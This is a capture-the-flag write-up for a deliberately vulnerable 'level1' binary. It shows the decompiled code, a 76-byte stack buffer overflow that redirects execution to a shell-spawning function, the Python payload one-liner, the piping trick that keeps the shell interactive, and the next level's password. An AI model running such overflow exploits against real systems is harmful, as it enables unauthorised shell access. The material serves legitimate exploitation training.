## Step 1: Static analysis

```asm
08048444  int32_t run()
08048444  {
0804846d      fwrite("Good... Wait what?\n", 1, 0x13, stdout);
0804847f      return system("/bin/sh");
08048444  }
```

```asm
08048480  int32_t main(int32_t argc, char** argv, char** envp)
08048480  {
08048496      void buf;
08048496      return gets(&buf);
08048480  }
```

### Explanation

The goal is to overwrite the return address in the stack with the address of the `run()` function (`0x08048444`), causing the program to execute the shell.

1. Determine the buffer size:
   - The size of `buf` (the buffer being overflowed) is 76 bytes before the saved return address.

2. Craft the payload:
   - Fill the buffer with 76 'A's to reach the return address.
   - Overwrite the return address with the address of `run()` (`0x08048444`), written in little-endian format as `'\x44\x84\x04\x08'`.

## Step 2: Exploit the Binary

```bash
python -c "print(('A' * 76) + '\x08\x04\x84\x44'[::-1])" > /tmp/exploit
cat /tmp/exploit - | ./level1
"Good... Wait what?"
% cd ../level2
% cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

The `cat /tmp/exploit - | ./level1` command sends the exploit payload to the program and keeps the input stream open for further interaction. The `-` ensures that after the payload is sent, the shell remains interactive, allowing you to execute commands.

Without `-`, the input stream would terminate after sending the payload, closing the shell immediately.

[StackOverflow: Why can't I open a shell from a pipelined process?](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process)
